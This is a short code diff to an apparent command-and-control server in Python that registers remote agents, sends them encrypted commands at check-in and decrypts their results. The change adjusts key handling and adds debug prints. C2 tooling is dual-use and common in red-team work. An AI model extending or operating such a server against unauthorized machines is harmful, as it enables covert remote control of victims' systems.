@@ -83,6 +83,8 @@ def checkin(request: CheckinRequest):
 
         # Send the base64 encoded key back to the client
         return {"key": key_b64, "message": "New agent registered"}
+    else:
+        key_b64 = ""  # Ensure key is not sent again for an already registered agent
 
     key = agents[agent_id]["key"]
     if agents[agent_id]["commands"]:
@@ -91,7 +93,7 @@ def checkin(request: CheckinRequest):
     else:
         response = encrypt_data("NoCommand", key)
 
-    return {"key": "", "data": response}
+    return {"key": key_b64, "data": response}
 
 @app.post("/result")
 def result(request: ResultRequest):
@@ -104,8 +106,10 @@ def result(request: ResultRequest):
         decrypted_result = decrypt_data(request.Result, key)
         message = f"Agent {agent_id} executed command with result: {decrypted_result}"
         logger.info(message)
+        print(message)  # Debugging statement
     except Exception as e:
         logger.error(f"Failed to process result from agent {agent_id}: {str(e)}")
+        print(f"Decryption failed: {str(e)}")  # Debugging statement
         raise HTTPException(status_code=400, detail="Decryption failed")
 
     return {"Status": "OK"}
